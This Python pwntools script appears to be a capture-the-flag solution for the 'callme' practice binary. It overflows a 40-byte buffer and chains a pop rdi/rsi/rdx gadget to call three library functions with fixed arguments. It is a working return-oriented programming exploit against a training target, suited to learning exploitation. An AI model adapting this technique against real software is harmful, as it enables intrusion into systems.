#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

def create_chain(function):
    # -- callme_??? (1,2,3) --
    chain =  p64(0x401ab0)   # pop rdi; pop rsi; pop rdx; ret
    chain += p64(0x1)
    chain += p64(0x2)
    chain += p64(0x3)
    chain += p64(function)   # callme_functions
    return chain

def exploit():
    p = process('./callme')

    payload = "A"*40                   # rip offset
    payload += create_chain(0x401850)  # objdump -D callme | grep callme_one
    payload += create_chain(0x401870)  # objdump -D callme | grep callme_two
    payload += create_chain(0x401810)  # objdump -D callme | grep callme_three

    p.sendlineafter('> ', payload)
    print p.recvall()

if __name__ == '__main__':
    exploit()
#_EOF